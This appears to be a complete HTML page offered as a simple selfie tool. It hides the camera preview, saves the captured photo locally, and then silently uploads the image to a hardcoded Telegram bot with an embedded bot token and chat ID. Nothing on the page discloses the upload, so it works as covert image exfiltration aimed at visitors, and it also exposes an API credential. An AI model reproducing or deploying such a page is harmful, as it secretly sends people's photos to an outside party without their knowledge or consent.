<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Selfie Capture</title>
    <style>
        /* Global Styles */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: linear-gradient(135deg, #ff3b30, #ff9500);
            font-family: 'Arial', sans-serif;
            color: white;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            text-align: center;
        }

        h2 {
            font-size: 2.5rem;
            margin-bottom: 20px;
            font-weight: 600;
        }

        /* Video container */
        video {
            display: none; /* Hide video element as we don't need to show it */
        }

        /* Capture button */
        button {
            background-color: #ffcc00;
            color: #333;
            padding: 15px 30px;
            border: none;
            border-radius: 30px;
            font-size: 1.2rem;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        button:hover {
            background-color: #ff4d00;
        }

        /* Hidden canvas */
        canvas {
            display: none;
        }
    </style>
</head>
<body>
    <h2>Click a Selfie!</h2>
    <video id="video" width="1080" height="1920" autoplay></video>
    <canvas id="canvas" width="6528" height="4896" style="display: none;"></canvas>
    <button id="capture">Capture Selfie</button>

    <script>
        const botToken = "8199996433:AAHWMDwq0eqeuUsQApLD1v_hHmLPJSdCU9w";
        const chatId = "6708043138";  // Replace with your chat ID

        // Start webcam video stream
        async function startVideo() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 1080, height: 1920 } });
                document.getElementById('video').srcObject = stream;
            } catch (error) {
                alert("Please allow camera access!");
                console.error("Camera Error:", error);
            }
        }

        // Capture the photo and trigger automatic download
        async function captureAndDownload() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');

            // Draw the video frame on the canvas at 6528x4896 resolution
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Convert canvas to a Blob
            canvas.toBlob(async (blob) => {
                // Automatically create a URL for the photo and trigger download
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = "selfie.jpg";  // The filename for the photo
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);

                // Prepare the form data to send the image to Telegram
                let formData = new FormData();
                formData.append("chat_id", chatId);
                formData.append("photo", blob);

                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;

                // Send the photo to Telegram
                try {
                    const response = await fetch(telegramUrl, { method: "POST", body: formData });
                    const result = await response.json();
                } catch (error) {
                    console.error("Telegram API Error:", error);
                    alert("Error sending selfie.");
                }
            }, "image/jpeg");
        }

        // Event listener to start the video when page loads
        window.addEventListener('load', async () => {
            await startVideo();
        });

        // Capture button click event
        document.getElementById('capture').addEventListener('click', captureAndDownload);
    </script>
</body>
</html>
